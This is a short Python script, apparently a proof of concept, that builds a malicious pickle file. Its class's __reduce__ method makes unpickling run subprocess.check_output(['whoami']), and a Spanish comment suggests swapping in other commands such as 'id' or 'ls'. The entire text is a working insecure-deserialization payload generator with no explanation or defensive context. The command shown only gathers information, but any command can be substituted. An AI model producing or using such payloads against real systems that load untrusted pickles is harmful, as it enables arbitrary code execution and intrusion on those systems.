import pickle
import subprocess

class ExecCommand:
    def __reduce__(self):
        #cambiar ["whoami"] por ["id"], ["ls"]
        return (subprocess.check_output, (["whoami"],))

with open("exec_whoami.pkl", "wb") as f:
    pickle.dump(ExecCommand(), f)
